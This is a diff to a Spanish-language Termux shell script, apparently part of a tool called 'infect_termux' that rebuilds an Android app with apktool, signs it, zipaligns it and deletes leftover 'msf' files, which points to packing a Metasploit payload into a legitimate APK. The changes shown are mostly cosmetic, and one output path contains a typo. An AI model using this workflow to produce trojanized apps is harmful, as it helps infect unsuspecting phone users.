@@ -1,5 +1,5 @@
 #!/usr/bin
-# da creditos si quieres copiar el codigo bro
+# da creditos si quieres copiar el codigo bro ju4n
 # COLORES
 clear
 red='\e[1;31m'
@@ -80,20 +80,22 @@ read ju4n
 nano $point
 clear
 banner
-echo -e -n $green"CONFIGURANDO APP"
+echo -e -n $green"CONFIGURANDO APP\n"
 apktool b /data/data/com.termux/files/home/infect_termux/original -o /data/data/com.termux/files/home/infect_termux/org1-modified.apk
 sleep 1
 clear
 banner
-echo -e -n $green"GENERANDO EL KEYSTORE"
+echo -e -n $green"GENERANDO EL KEYSTORE\n"
 keytool -genkey -V -keystore /data/data/com.termux/files/home/infect_termux/org1.keystore -alias org1 -keyalg RSA -keysize 2048 -validity 10000
 sleep 1
 clear
 banner
-echo -e -n $green"FIRMANDO LA APP"
+echo -e -n $green"FIRMANDO LA APP\n"
 echo -e -n $green"CON JARSIGNER"
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /data/data/com.termux/files/home/infect_termux/org1.keystore /data/data/com.termux/files/home/infect_termux/org1-modified.apk org1
 sleep 1
+clear
+banner
 echo -e -n $negro"\n[ + ] ALINEAR LOS DATOS\n"
 zipalign -v 4 /data/data/com.termux/files/home/infect_termux/org1-modified.apk /data/data/com.temrux/files/infect_termux/$out
 sleep 1
@@ -101,9 +103,9 @@ rm -rf /data/data/com.termux/files/home/infect_termux/org1.keystore
 rm -rf /data/data/com.termux/files/home/infect_termux/msf
 rm -rf /data/data/com.termux/files/home/infect_termux/original
 rm -rf /data/data/com.termux/files/home/infect_termux/msf.apk
-rm -rf /data/data/com.termux/file/home/infect_termux/org1-modified.apk
 clear
-echo -e $cian"App Guardada Como:$out"
+banner
+echo -e $cian"App Guardada Como > org1-modified.apk"
 }
 
 
